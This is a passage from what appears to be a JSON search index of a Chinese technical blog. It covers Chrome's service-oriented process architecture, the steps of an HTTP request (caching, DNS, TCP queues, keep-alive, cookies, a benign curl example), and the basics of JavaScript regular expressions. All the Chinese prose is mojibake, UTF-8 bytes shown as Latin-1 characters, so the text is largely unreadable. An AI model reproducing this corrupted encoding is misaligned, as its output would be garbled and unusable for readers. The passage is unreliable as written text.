æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šåŒ…å«å…¬å…±åŸºç¡€ç»“æ„çš„å‰¯æœ¬(å¦‚JavaScriptè¿è¡Œç¯å¢ƒ)ï¼Œæ„å‘³ç€æµè§ˆå™¨ä¼šæ¶ˆè€—æ›´å¤šçš„å†…å­˜èµ„æº æ›´å¤æ‚çš„ä½“ç³»æ¶æ„: æµè§ˆå™¨å„æ¨¡å—ä¹‹é—´è€¦åˆæ€§é«˜ã€æ‰©å±•æ€§å·®ç­‰é—®é¢˜ï¼Œä¼šå¯¼è‡´ç°åœ¨çš„æ¶æ„å·²ç»å¾ˆéš¾é€‚åº”æ–°éœ€æ±‚ å¯¹äºä¸Šé¢è¿™ä¸¤ä¸ªé—®é¢˜ï¼ŒChromeå›¢é˜Ÿä¸€ç›´åœ¨å¯»æ±‚ä¸€ç§å¼¹æ€§æ–¹æ¡ˆï¼Œæ—¢å¯ä»¥è§£å†³èµ„æºå ç”¨é«˜çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥è§£å†³ å¤æ‚çš„ä½“ç³»æ¶æ„çš„é—®é¢˜ é¢å‘æœåŠ¡çš„æ¶æ„\n4ã€æœªæ¥é¢å‘æœåŠ¡çš„æ¶æ„ï¼ˆSOAï¼‰ é¢å‘æœåŠ¡çš„æ¶æ„ï¼šå„ç§æ¨¡å—ä¼šè¢«é‡æ„æˆç‹¬ç«‹çš„æœåŠ¡(Service)ï¼Œæ¯ä¸ªæœåŠ¡ (Service)éƒ½å¯ä»¥åœ¨ç‹¬ç«‹çš„è¿›ç¨‹ä¸­è¿è¡Œï¼Œè®¿é—®æœåŠ¡(Service)å¿…é¡»ä½¿ç”¨å®šä¹‰å¥½çš„æ¥å£ï¼Œé€šè¿‡IPCæ¥é€šä¿¡ã€‚æœ€ç»ˆè¦æŠŠUIã€æ•°æ®åº“ã€æ–‡ä»¶ã€è®¾å¤‡ã€ç½‘ç»œç­‰æ¨¡å—é‡æ„ä¸ºåŸºç¡€æœåŠ¡ï¼Œç±»ä¼¼æ“ä½œç³»ç»Ÿåº•å±‚æœåŠ¡\nå›¾ï¼šChromeâ€œé¢å‘æœåŠ¡çš„æ¶æ„â€è¿›ç¨‹æ¨¡å‹å›¾\nåŒæ—¶æä¾›çµæ´»çš„å¼¹æ€§ç»“æ„ï¼Œåœ¨å¼ºå¤§æ€§èƒ½è®¾å¤‡ä¸Šä¼šä»¥å¤šè¿›ç¨‹çš„æ–¹å¼è¿è¡ŒåŸºç¡€æœåŠ¡ã€‚åœ¨èµ„æºå—é™çš„è®¾å¤‡ä¸Šï¼ŒChromeä¼šå°†å¾ˆå¤šæœåŠ¡æ•´åˆåˆ°ä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œä»è€ŒèŠ‚çœå†…å­˜å ç”¨\nå›¾ï¼šåœ¨èµ„æºä¸è¶³çš„è®¾å¤‡ä¸Šï¼Œå°†æœåŠ¡åˆå¹¶åˆ°æµè§ˆå™¨è¿›ç¨‹ä¸­\nChromeçš„æ¶æ„ä½“ç³»å˜å¾—è¶Šæ¥è¶Šå¤æ‚ï¼Œæ¶æ„çš„å¤æ‚æ€§å€’é€¼Chromeå¼€å‘å›¢é˜Ÿå¿…é¡»è¿›è¡Œæ¶æ„çš„é‡æ„ï¼Œæœ€ç»ˆChromeå›¢é˜Ÿé€‰æ‹©äº†é¢å‘æœåŠ¡æ¶æ„(SOA)å½¢å¼ã€‚ä»è€Œæ„å»ºä¸€ä¸ªæ›´å†…èšã€æ¾è€¦åˆã€æ˜“äºç»´æŠ¤å’Œæ‰©å±•çš„ç³»ç»Ÿï¼Œæ›´å¥½å®ç° Chrome ç®€å•ã€ç¨³å®šã€é«˜é€Ÿã€å®‰å…¨çš„ç›®æ ‡\nå‚è€ƒ æµè§ˆå™¨å·¥ä½œåŸç†ä¸å®è·µ.æå…µ æµè§ˆå™¨å·¥ä½œåŸç†.timç¬”è®° æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/chrome-framework/","summary":"å®è§‚è§†è§’ä¸‹ï¼ŒèŠä¸€ä¸‹æµè§ˆå™¨ï¼Œä¸ºä»€ä¹ˆæ‰“å¼€1ä¸ªé¡µé¢ï¼Œå´æœ‰4ä¸ªè¿›ç¨‹?","title":"æµè§ˆå™¨: Chromeæ¶æ„-æ‰“å¼€äº†1ä¸ªâ»šé¢ï¼Œå´æœ‰4ä¸ªè¿›ç¨‹ï¼Ÿ"},{"content":"httpå’ŒTCPçš„å…³ç³»? ä»€ä¹ˆæ˜¯ HTTPåè®®ï¼Ÿå»ºç«‹åœ¨TCPè¿æ¥åŸºç¡€ä¹‹ä¸Šï¼Œä¸€ç§å…è®¸æµè§ˆå™¨å‘æœåŠ¡å™¨è·å–èµ„æº(JavaScriptã€CSSã€å›¾ç‰‡ç­‰)çš„åè®®\u0026hellip;\nå®Œæ•´çš„HTTPè¯·æ±‚åŒ…æ‹¬ä¸¤ä¸ªè¿‡ç¨‹ï¼š\næµè§ˆå™¨ç«¯å‘èµ·HTTPè¯·æ±‚æµç¨‹ æœåŠ¡å™¨ç«¯å¤„ç†HTTPè¯·æ±‚æµç¨‹ ä¸€ã€ æµè§ˆå™¨ç«¯å‘èµ·HTTPè¯·æ±‚æµç¨‹ æ„å»ºè¯·æ±‚ æŸ¥æ‰¾ç¼“å­˜ï¼šç¼“è§£æœåŠ¡å™¨ç«¯å‹åŠ›ã€å¿«é€Ÿèµ„æºåŠ è½½ ç¼“å­˜æŸ¥æ‰¾å¤±è´¥ï¼Œè¿›å…¥ç½‘ç»œè¯·æ±‚è¿‡ç¨‹ï¼šå‡†å¤‡IPåœ°å€å’Œç«¯å£ ç­‰å¾…ã€å»ºç«‹TCPé˜Ÿåˆ— å‘é€HTTPè¯·æ±‚ 1ã€æµè§ˆå™¨ç¼“å­˜ ä¸€ç§åœ¨æœ¬åœ°ä¿å­˜èµ„æºå‰¯æœ¬ï¼Œä»¥ä¾›ä¸‹æ¬¡è¯·æ±‚ç›´æ¥ä½¿ç”¨çš„æŠ€æœ¯\nå½“æµè§ˆå™¨å‘ç°è¯·æ±‚çš„èµ„æºå·²ç»åœ¨æµè§ˆå™¨ç¼“å­˜ä¸­å­˜æœ‰å‰¯æœ¬ï¼Œå®ƒä¼šæ‹¦æˆªè¯·æ±‚ï¼Œè¿”å›è¯¥èµ„æºçš„å‰¯æœ¬ï¼Œå¹¶ç›´æ¥ç»“æŸè¯· æ±‚ï¼Œè€Œä¸ä¼šå†å»æºæœåŠ¡å™¨é‡æ–°ä¸‹è½½ã€‚è‹¥ç¼“å­˜æŸ¥æ‰¾å¤±è´¥ï¼Œåˆ™è¿›å…¥ç½‘ç»œè¯·æ±‚è¿‡ç¨‹\nå¥½å¤„ï¼š\nç¼“è§£æœåŠ¡å™¨ç«¯å‹åŠ› å®ç°èµ„æºå¿«é€ŸåŠ è½½ 2ã€ç¼“å­˜æŸ¥æ‰¾å¤±è´¥ï¼Œè¿›å…¥ç½‘ç»œè¯·æ±‚è¿‡ç¨‹ï¼šå‡†å¤‡IPåœ°å€å’Œç«¯å£ æµè§ˆå™¨ä½¿ç”¨HTTPåè®®ä½œä¸ºåº”ç”¨å±‚åè®®ï¼Œå°å­˜è¯·æ±‚çš„æ–‡æœ¬ä¿¡æ¯ã€‚ä¸”ä½¿ç”¨TCP/IPä½œä¸ºä¼ è¾“å±‚åè®®å°†å…¶å‘å¸ƒåˆ°ç½‘ç»œä¸Šã€‚\nHTTPçš„å†…å®¹æ˜¯é€šè¿‡TCPçš„ä¼ è¾“æ•°æ®é˜¶æ®µæ¥å®ç°çš„ï¼Œåœ¨HTTPå·¥ä½œå¼€å§‹ä¹‹å‰ï¼Œæµè§ˆå™¨éœ€è¦é€šè¿‡TCPä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥\næ•°æ®åŒ…éƒ½æ˜¯é€šè¿‡IPåœ°å€ä¼ è¾“ç»™æ¥æ”¶æ–¹ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åŸŸåç³»ç»ŸDNSï¼ˆDomain Name Systemï¼‰ï¼Œæ ¹æ®åŸŸåå’ŒIPåœ°å€çš„æ˜ å°„å…³ç³»ï¼Œè·å–åˆ°ä¸»æœºIP\nçœŸæ­£çš„ç¬¬ä¸€æ­¥æµè§ˆå™¨ä¼šè¯·æ±‚DNSè¿”å›åŸŸåå¯¹åº”çš„IPï¼Œå½“ç„¶æµè§ˆå™¨è¿˜æä¾›äº†DNSæ•°æ®ç¼“å­˜æœåŠ¡ï¼Œå¦‚æœæŸä¸ªåŸŸåå·²ç»è§£æè¿‡äº†ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šç¼“å­˜è§£æçš„ç»“æœï¼Œä»¥ä¾›ä¸‹æ¬¡æŸ¥è¯¢æ—¶ç›´æ¥ä½¿ç”¨ï¼Œè¿™æ ·ä¹Ÿä¼šå‡å°‘ä¸€æ¬¡ç½‘ç»œè¯·æ±‚ åŸŸåç³»ç»Ÿ(DNS)\n3ã€ç­‰å¾…ã€å»ºç«‹TCPé˜Ÿåˆ— Chromeæœ‰ä¸ªæœºåˆ¶ï¼ŒåŒä¸€ä¸ªåŸŸååŒæ—¶æœ€å¤šåªèƒ½å»ºç«‹6ä¸ªTCPè¿æ¥ã€‚å³åœ¨åŒä¸€ä¸ªåŸŸåä¸‹åŒæ—¶æœ‰10ä¸ªè¯·æ±‚å‘ç”Ÿï¼Œé‚£ä¹ˆå…¶ä¸­4ä¸ªè¯·æ±‚ä¼šè¿›å…¥æ’é˜Ÿç­‰å¾…çŠ¶æ€ï¼Œç›´è‡³è¿›è¡Œä¸­çš„è¯·æ±‚å®Œæˆã€‚å¦‚æœå½“å‰è¯·æ±‚æ•°é‡å°‘äº6ï¼Œä¼šç›´æ¥è¿›å…¥ä¸‹ä¸€æ­¥ï¼Œå»ºç«‹TCPè¿æ¥\nHTTPå·¥ä½œå¼€å§‹ä¹‹å‰ï¼Œæµè§ˆå™¨é€šè¿‡TCPä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥â€”â€”ä¸‰æ¬¡æ¡æ‰‹\n4ã€ å‘é€HTTPè¯·æ±‚ å»ºç«‹äº†TCPè¿æ¥ï¼Œæµè§ˆå™¨å°±å¯ä»¥å’ŒæœåŠ¡å™¨è¿›è¡Œé€šä¿¡äº†ã€‚è€ŒHTTPä¸­çš„æ•°æ®æ­£æ˜¯åœ¨è¿™ä¸ªé€šä¿¡è¿‡ç¨‹ä¸­ä¼ è¾“çš„\nè¯·æ±‚è¡Œï¼š å‘Šè¯‰æœåŠ¡å™¨æµè§ˆå™¨éœ€è¦ä»€ä¹ˆèµ„æº åŒ…æ‹¬è¯·æ±‚æ–¹æ³•ã€è¯·æ±‚URI(Uniform Resource Identifier)å’ŒHTTPåè®®ç‰ˆæœ¬ è¯·æ±‚å¤´ï¼šæŠŠæµè§ˆå™¨çš„ä¸€äº›åŸºç¡€ä¿¡æ¯å‘Šè¯‰æœåŠ¡å™¨ï¼Œæ¯”å¦‚ï¼šæµè§ˆå™¨æ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿã€æµè§ˆå™¨å†…æ ¸ç­‰ä¿¡æ¯ï¼Œä»¥åŠå½“å‰è¯·æ±‚çš„åŸŸåä¿¡æ¯ã€æµè§ˆå™¨ç«¯çš„ Cookieä¿¡æ¯ç­‰ è¯·æ±‚ä½“ï¼šPostè¯·æ±‚ï¼Œç­‰å‘é€ä¸€äº›æ•°æ®ç»™æœåŠ¡å™¨ äºŒã€æœåŠ¡å™¨ç«¯å¤„ç†HTTPè¯·æ±‚æµç¨‹ curlå‘½ä»¤æŸ¥çœ‹\nè¿”å›è¯·æ±‚ æ–­å¼€è¿æ¥ é‡å®šå‘ 1ã€è¿”å›è¯·æ±‚ curlå‘½ä»¤curl -i https://time.geekbang.org/æŸ¥çœ‹è¿”å›è¯·æ±‚æ•°æ®\niæ˜¯ä¸ºäº†è¿”å›å“åº”è¡Œã€å“åº”å¤´å’Œå“åº”ä½“çš„æ•°æ®ã€‚-Iè¡¨ç¤ºåªè·å–å“åº”å¤´å’Œå“åº”è¡Œæ•°æ®ï¼Œä¸éœ€è¦è·å–å“åº”ä½“çš„æ•°æ®\nå“åº”è¡Œï¼šåŒ…å«åè®®ç‰ˆæœ¬å’ŒçŠ¶æ€ç  å“åº”å¤´ï¼šåŒ…å«æœåŠ¡å™¨ä¿¡æ¯ï¼Œæ¯”å¦‚æœåŠ¡å™¨ç”Ÿæˆè¿”å›æ•°æ®çš„æ—¶é—´ã€è¿”å›çš„æ•°æ®ç±»å‹(JSONã€HTMLã€æµåª’ä½“ç­‰ç±» å‹)ï¼Œä»¥åŠæœåŠ¡å™¨è¦åœ¨å®¢æˆ¶ç«¯ä¿å­˜çš„Cookieç­‰ å“åº”ä½“ï¼šåŒ…å«äº†HTMLçš„å®é™…å†…å®¹ 2ã€æ–­å¼€è¿æ¥ é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸€æ—¦æœåŠ¡å™¨å‘å®¢æˆ¶ç«¯è¿”å›äº†è¯·æ±‚æ•°æ®ï¼Œå®ƒå°±è¦å…³é—­ TCP è¿æ¥ã€‚ä½†å¯é…ç½®Connection:Keep-Aliveé•¿è¿æ¥ï¼ŒTCPè¿æ¥åœ¨å‘é€åå°†ä»ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œæµè§ˆå™¨å°±å¯ä»¥ç»§ç»­é€šè¿‡åŒä¸€ä¸ªTCPè¿æ¥å‘é€è¯·æ±‚\nä¿æŒTCPè¿æ¥å¯ä»¥çœå»ä¸‹æ¬¡è¯·æ±‚æ—¶éœ€è¦å»ºç«‹è¿æ¥çš„æ—¶é—´ï¼Œæå‡èµ„æºåŠ è½½é€Ÿåº¦\n3ã€é‡å®šå‘æ“ä½œ éœ€è¦é‡å®šå‘çš„ç½‘å€æ­£æ˜¯åŒ…å«åœ¨å“åº”å¤´çš„Locationå­—æ®µ\nä¸‰ã€å‡ ä¸ªé—®é¢˜ 1ã€HTTPè¯·æ±‚æµç¨‹: ä¸ºä»€ä¹ˆå¾ˆå¤šç«™ç‚¹ç¬¬äºŒæ¬¡æ‰“å¼€é€Ÿåº¦ä¼šå¾ˆå¿« ä¸»è¦åŸå› æ˜¯ç¬¬ä¸€æ¬¡åŠ è½½â»šé¢è¿‡ç¨‹ä¸­ï¼ŒDNSç¼“å­˜ã€é¡µé¢èµ„æºç¼“å­˜\nDNSç¼“å­˜æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯åœ¨æµè§ˆå™¨æœ¬åœ°æŠŠå¯¹åº”çš„IPå’ŒåŸŸåå…³è”èµ·æ¥\næµè§ˆå™¨èµ„æºç¼“å­˜å¤„ç†çš„è¿‡ç¨‹ï¼š ç¬¬ä¸€æ¬¡è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›HTTPå“åº”å¤´ç»™æµè§ˆå™¨æ—¶ï¼Œæµè§ˆå™¨æ˜¯é€šè¿‡å“åº”å¤´ä¸­çš„Cache-Controlå­—æ®µæ¥è®¾ç½®æ˜¯å¦ç¼“å­˜è¯¥èµ„æºã€‚ä»¥åŠCache-Control:Max-age=2000è®¾ç½®è¯¥èµ„æºç¼“å­˜è¿‡æœŸæ—¶â»“ã€‚\nç¼“å­˜èµ„æºè¿˜æœªè¿‡æœŸçš„æƒ…å†µä¸‹, å¦‚æœå†æ¬¡è¯·æ±‚è¯¥èµ„æºï¼Œä¼šç›´æ¥è¿”å›ç¼“å­˜ä¸­çš„èµ„æºç»™æµè§ˆ å™¨ ç¼“å­˜è¿‡æœŸäº†ï¼Œæµè§ˆå™¨åˆ™ä¼šç»§ç»­å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œå¹¶ä¸”åœ¨HTTPè¯·æ±‚å¤´ä¸­å¸¦ä¸ŠIf-None-Match:\u0026quot;4f80f-13c-3a1xb12a\u0026quot; æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚å¤´åï¼Œä¼šæ ¹æ®If-None-Matchçš„å€¼æ¥åˆ¤æ–­è¯·æ±‚çš„èµ„æºæ˜¯å¦æœ‰æ›´æ–°\næ²¡æœ‰æ›´æ–°ï¼Œå°±è¿”å›304çŠ¶æ€ç ï¼Œç›¸å½“äºæœåŠ¡å™¨å‘Šè¯‰æµè§ˆå™¨:â€œè¿™ä¸ªç¼“å­˜å¯ä»¥ç»§ç»­ä½¿ç”¨ï¼Œè¿™æ¬¡å°±ä¸é‡å¤ å‘é€æ•°æ®ç»™ä½ äº† èµ„æºæœ‰æ›´æ–°ï¼ŒæœåŠ¡å™¨å°±ç›´æ¥è¿”å›æœ€æ–°èµ„æºç»™æµè§ˆå™¨ åœ¨æµè§ˆå™¨ä¸­è®¿é—®çš„æ—¶å€™æ‰“å¼€networké¢æ¿ï¼Œå‘ç°ç¼“ å­˜çš„æ¥æºæœ‰çš„from diskæœ‰çš„æ˜¯from memory ???\né˜²æ­¢ç½‘ç»œåŠ«æŒï¼šhttpåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯æ˜æ–‡çš„ï¼Œæ‰€ä»¥æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯èƒ½å¤Ÿè¢«æˆªè·æˆ–è€…ä¿®æ”¹çš„\n2ã€ç™»å½•çŠ¶æ€å¦‚ä½•ä¿æŒï¼Ÿ æœåŠ¡å™¨æ¥æ”¶åˆ°æµè§ˆå™¨æäº¤çš„ä¿¡æ¯ä¹‹åï¼ŒæŸ¥è¯¢åå°ï¼ŒéªŒè¯ç”¨æˆ¶ç™»å½•ä¿¡æ¯æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®çš„è¯ï¼Œä¼šç”Ÿæˆä¸€æ®µè¡¨ç¤ºç”¨æˆ¶èº«ä»½çš„å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠè¯¥å­—ç¬¦ä¸²å†™åˆ°å“åº”å¤´çš„Set-Cookieå­—æ®µé‡Œ æµè§ˆå™¨æ¥æ”¶åˆ°æœåŠ¡å™¨çš„å“åº”å¤´ä¸”è§£æï¼Œå¦‚æœæœåŠ¡å™¨ç«¯å‘é€çš„å“åº”å¤´å†…æœ‰ Set-Cookie çš„å­—æ®µï¼Œé‚£ä¹ˆæµè§ˆå™¨å°±ä¼šå°†è¯¥å­—æ®µçš„å†…å®¹ä¿æŒåˆ°æœ¬åœ°ã€‚ ç”¨æˆ·å†æ¬¡è®¿é—®ï¼Œå‘èµ·HTTPè¯·æ±‚å‰ï¼Œæµè§ˆå™¨ä¼šè¯»å–ä¹‹å‰ä¿å­˜çš„Cookieæ•°æ®ï¼Œå¹¶æŠŠæ•°æ®å†™è¿›è¯·æ±‚å¤´é‡Œçš„Cookieå­—æ®µé‡Œå†å°†è¯·æ±‚å¤´å‘é€ç»™æœåŠ¡å™¨ æœåŠ¡å™¨ç«¯å‘ç°å®¢æˆ¶ç«¯å‘é€è¿‡æ¥çš„Cookieåï¼Œä¼šå»æ£€æŸ¥ç©¶ç«Ÿæ˜¯ä»å“ªä¸€ä¸ªå®¢æˆ¶ç«¯å‘æ¥çš„è¿æ¥è¯·æ±‚ï¼Œç„¶åå¯¹æ¯”æœåŠ¡å™¨ä¸Šçš„è®°å½•ï¼Œæœ€åå¾—åˆ°è¯¥ç”¨æˆ¶çš„çŠ¶æ€ä¿¡æ¯ å››ã€æ€»ç»“HTTPè¯·æ±‚æµç¨‹ æµè§ˆå™¨ä¸­çš„HTTPè¯·æ±‚ä»å‘èµ·åˆ°ç»“æŸä¸€å…±ç»å†äº†å¦‚ä¸‹å…«ä¸ªé˜¶æ®µ:æ„å»ºè¯·æ±‚ã€æŸ¥æ‰¾ç¼“å­˜ã€å‡† å¤‡IPå’Œç«¯å£ã€ç­‰å¾…TCPé˜Ÿåˆ—ã€å»ºç«‹TCPè¿æ¥ã€å‘èµ·HTTPè¯·æ±‚ã€æœåŠ¡å™¨å¤„ç†è¯·æ±‚ã€æœåŠ¡å™¨è¿”å›è¯·æ±‚å’Œæ–­å¼€è¿æ¥\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/06.http-request-process/","summary":"\u003cp\u003ehttpå’ŒTCPçš„å…³ç³»? ä»€ä¹ˆæ˜¯ HTTPåè®®ï¼Ÿå»ºç«‹åœ¨TCPè¿æ¥åŸºç¡€ä¹‹ä¸Šï¼Œä¸€ç§å…è®¸æµè§ˆå™¨å‘æœåŠ¡å™¨è·å–èµ„æº(JavaScriptã€CSSã€å›¾ç‰‡ç­‰)çš„åè®®\u0026hellip;\u003c/p\u003e","title":"ç½‘ç»œè¿›ç¨‹ï¼šHttpè¯·æ±‚æµç¨‹"},{"content":"æ­£åˆ™è¡¨è¾¾å¼ï¼ˆregular expressionï¼‰æ˜¯ä¸€ç§è¡¨è¾¾æ–‡æœ¬æ¨¡å¼ï¼ˆå³å­—ç¬¦ä¸²ç»“æ„ï¼‰çš„æ–¹æ³•ï¼Œæœ‰ç‚¹åƒå­—ç¬¦ä¸²çš„æ¨¡æ¿ï¼Œå¸¸å¸¸ç”¨æ¥æŒ‰ç…§â€œç»™å®šæ¨¡å¼â€åŒ¹é…æ–‡æœ¬\u0026hellip;\nä¸€ã€åŸºç¡€è¯­æ³• æ–°å»ºæ­£åˆ™è¡¨è¾¾å¼æœ‰ä¸¤ç§æ–¹æ³•:\nä½¿ç”¨å­—é¢é‡ï¼Œä»¥æ–œæ /è¡¨ç¤ºå¼€å§‹å’Œç»“æŸ ä½¿ç”¨RegExpæ„é€ å‡½æ•° // åœ¨å¼•æ“ç¼–è¯‘ä»£ç æ—¶ï¼Œå°±ä¼šæ–°å»ºæ­£åˆ™è¡¨è¾¾å¼ // æ•ˆç‡è¾ƒé«˜ã€æ¯”è¾ƒä¾¿åˆ©å’Œç›´è§‚ã€‚å®é™…åº”ç”¨ä¸­ï¼ŒåŸºæœ¬éƒ½é‡‡ç”¨è¿™ç§æ–¹å¼ const regex = /xyz/i; // è¿è¡Œæ—¶æ–°å»ºæ­£åˆ™è¡¨è¾¾å¼ const regex = new RegExp(\u0026#39;xyz\u0026#39;, \u0026#39;i\u0026#39;); ç¬¬äºŒä¸ªå‚æ•°iï¼Œè¡¨ç¤ºä¿®é¥°ç¬¦\ni: å¿½ç•¥å¤§å°å†™ g: å…¨å±€åŒ¹é…ï¼ˆglobalï¼‰ m: å¤šè¡Œæ¨¡å¼ï¼Œä¼šä¿®æ”¹^å’Œ$çš„è¡Œä¸ºã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ^å’Œ$åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹å¤„å’Œç»“å°¾å¤„ï¼ŒåŠ ä¸Šmä¿®é¥°ç¬¦ä»¥åï¼Œ^å’Œ$ä¼šè¯†åˆ«æ¢è¡Œç¬¦\\nåŒ¹é…è¡Œé¦–å’Œè¡Œå°¾ const reg = /world$/ const reg1 = /world$/m const str = \u0026#39;hello world\\n\u0026#39; reg.test(str) // false reg1.test(str) // true 1. å®ä¾‹æ–¹æ³• test()è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºå½“å‰æ¨¡å¼æ˜¯å¦èƒ½åŒ¹é…å‚æ•°å­—ç¬¦ä¸² exec()ç”¨æ¥è¿”å›åŒ¹é…ç»“æœã€‚åŒ¹é…åˆ™è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæˆå‘˜æ˜¯åŒ¹é…æˆåŠŸçš„å­å­—ç¬¦ä¸²ï¼Œå¦åˆ™è¿”å›null var s = \u0026#39;_x_x\u0026#39;; var r1 = /x/; var r2 = /y/; r1.test(s) // true r1.exec(s) // [\u0026#34;x\u0026#34;] r2.exec(s) // null 2. å­—ç¬¦ä¸²çš„å®ä¾‹æ–¹æ³• String.prototype.match(): å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œè¿”å›åŒ¹é…ç»“æœ\nä¸æ­£åˆ™å¯¹è±¡çš„exec()ç±»ä¼¼ï¼šåŒ¹é…æˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ¹é…å¤±è´¥è¿”å›null å¸¦æœ‰gä¿®é¥°ç¬¦ï¼Œåˆ™ä¸æ­£åˆ™å¯¹è±¡çš„exec()è¡Œä¸ºä¸åŒï¼Œä¼šä¸€æ¬¡æ€§è¿”å›æ‰€æœ‰åŒ¹é…æˆåŠŸçš„ç»“æœ const reg = /x/g; const reg1 = /x/; const reg2 = /y/; const str1 = \u0026#39;_x_x\u0026#39;; const str2 = \u0026#39;abba\u0026#39;; str1.match(reg1) // [\u0026#34;x\u0026#34;] str1.match(reg2) // null str1.match(reg) // [\u0026#34;x\u0026#34;, \u0026#34;x\u0026#34;] reg1.exec(str1) // [\u0026#34;x\u0026#34;] 3. åŒ¹é…è§„åˆ™ â€œå­—é¢é‡å­—ç¬¦â€: æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼ŒæŸä¸ªå­—ç¬¦åªè¡¨ç¤ºå®ƒå­—é¢çš„å«ä¹‰(å°±åƒä¸‹é¢çš„aå’Œb) æ¯”å¦‚/a/åŒ¹é…aï¼Œ/b/åŒ¹é…b\nå…ƒå­—ç¬¦ï¼šé™¤å­—é¢é‡å­—ç¬¦å¤–ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†å­—ç¬¦ä¸ä»£è¡¨å­—é¢çš„æ„æ€ï¼Œæœ‰ç‰¹æ®Šå«ä¹‰ ç‚¹å­—ç¬¦.: åŒ¹é…é™¤å›è½¦\\rã€æ¢è¡Œ\\n ã€è¡Œåˆ†éš”ç¬¦\\u2028å’Œæ®µåˆ†éš”ç¬¦\\u2029ä»¥å¤–çš„æ‰€æœ‰å­—ç¬¦ ä½ç½®å­—ç¬¦: ^ è¡¨ç¤ºå­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ï¼Œ$è¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“æŸä½ç½® é€‰æ‹©ç¬¦: | è¡¨ç¤ºâ€œæˆ–å…³ç³»â€ï¼ˆORï¼‰ é‡è¯ç¬¦?: æŸä¸ªæ¨¡å¼å‡ºç°0æ¬¡æˆ–1æ¬¡ï¼Œç­‰åŒäº{0, 1} é‡è¯ç¬¦\\*: æŸä¸ªæ¨¡å¼å‡ºç°0æ¬¡æˆ–å¤šæ¬¡ï¼Œç­‰åŒäº{0,} é‡è¯ç¬¦+: æŸä¸ªæ¨¡å¼å‡ºç°1æ¬¡æˆ–å¤šæ¬¡ï¼Œç­‰åŒäº{1,} æ•è·ç¬¦() const reg = /(.)b(.)/g; reg.test(\u0026#39;dbc\u0026#39;) // true reg.test(\u0026#39;db\u0026#39;) // false \u0026#39;abcdba\u0026#39;.match(reg) // [\u0026#39;abc\u0026#39;, \u0026#39;dba\u0026#39;] []: å­—ç¬¦é›†ï¼šè¿å­—ç¬¦-å’Œè„±å­—ç¬¦^ // [] åŒ¹é…è¿™ä¸ªé›†åˆä¸­çš„ä»»ä¸€ä¸€ä¸ªå­—ç¬¦(æˆ–å…ƒå­—ç¬¦) // è„±å­—ç¬¦`^`: æ–¹æ‹¬å·å†…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯`[^]`ï¼Œåˆ™è¡¨ç¤ºé™¤äº†å­—ç¬¦ç±»ä¹‹ä¸­çš„å­—ç¬¦ï¼Œå…¶ä»–å­—ç¬¦éƒ½å¯ä»¥åŒ¹é… // è¿å­—ç¬¦`-`: æ–¹æ‹¬å·å†…è¿ç»­åºåˆ—çš„å­—ç¬¦ï¼Œè¿å­—ç¬¦`[-]`ç”¨æ¥æä¾›ç®€å†™å½¢å¼ const reg = /[^abc]/ const reg1 = /[abc]/ reg.test(\u0026#39;hello world\u0026#39;) // true reg.test(\u0026#39;bbc\u0026#39;) // false reg1.test(\u0026#39;ade\u0026#39;) // true 